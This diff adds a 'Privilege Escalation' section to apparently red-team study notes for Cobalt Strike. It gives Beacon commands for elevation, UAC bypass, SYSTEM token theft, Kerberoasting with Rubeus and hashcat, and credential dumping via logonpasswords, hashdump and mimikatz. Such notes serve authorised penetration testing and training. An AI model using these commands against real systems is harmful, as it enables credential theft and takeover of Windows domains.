@@ -451,6 +451,71 @@ If you're in the network, know lateral creds but do not have access to CS: Windo
 
 ## Privilege Escalation ##
 
+### Escalation Options ###
+``` elevate ``` in the Beacon console to spawn an elevated session
+
+``` runasadmin ``` to run w/ elevated privileges
+
+'Cobalt Strike' > 'Script Manager' > Load 'Elevate Kit' - Gives more elevation and runasadmin options
+
+#### SharpUp ####
+Privilege Escalation "vulnerability scanner" that looks for misconfigurations in the system.
+
+``` execute-assembly /<local-path>/SharpUp.exe all ```
+
+#### Kerberoasting ####
+1. Query the domain controller for accounts with SPNs (Service Principle Name) - service logon accounts associated with a service
+2. Request a TGS Ticket for the associated service
+3. Try to recover the password by cracking the TGS ticket - because part of it is encrypted with the domain user's password hash
+
+``` execute-assembly /<local-path>/rubeus.exe kerberoast /outfile:hashes.txt ```
+
+``` hashcat -m 13100 -a 0 --force -o <output>.txt <input - hashes.txt> <wordlist> ``` - To crack the hashes
+
+### Bypass User Access Control (UAC) and Get SYSTEM ###
+* Use ` elevate uac-token-duplication <listener> ` - Fixed in Windows 10 RS5 (Oct 2018)
+* Use ` runasadmin uac-cmstplua <command> ` 
+* Use options in the Elevate Kit
+
+#### Access Token ####
+Concept not present in Linux, only Windows. It is a data structure managed within lsas, created after logon and associated with each process and thread, and persists in memory until reboot.
+
+It contains:
+* User and Group Information
+* A list of privileges on the local computer
+* Restrictions
+* Reference to credentials
+
+``` run whoami /priv ``` - To get the privileges on the present token
+
+``` getprivs ``` - To enable the disabled privileges
+
+The 'SYSTEM' token is one way to obtain full privileges over the machine. 
+
+``` getsystem ``` - To search for and impersonate the SYSTEM token
+
+``` elevate svc-exe <listener> ``` - To spawn a session via a service executable
+
+### Credential and Hash Harvesting ###
+* ``` logonpasswords ``` - Recovers credentials - Risky, alternatives: 'GhostPack SafetyKatz.exe', 'Internal Monologue (current user)'
+* ``` hashdump ``` - Recovers local account hashes - Risky, alternatives: 'dcsync', '```mimikatz !lsadump::sam ```(local)'
+
+In CS, 'View' > 'Credentials' - To manage credentials 
+
+### Mimikatz in Beacon ###
+Mimikatz is a post-exploitation toolset for:
+* Advanced Persistence
+* Harvest 'Trust Material'
+* Re-purpose 'Trust Material'
+
+``` mimikatz <command> <arguments> ``` - Run mimikatz command
+
+``` mimikatz !<command> <arguments> ``` - Elevate to SYSTEM and run mimikatz command
+
+``` mimikatz @<command> <arguments> ``` - Use current token to run mimikatz command
+
+[Mimikatz Github Wiki](https://github.com/gentilkiwi/mimikatz/wiki "Mimikatz Github Wiki")
+
 - - - -
 
 ## Lateral Movement ##
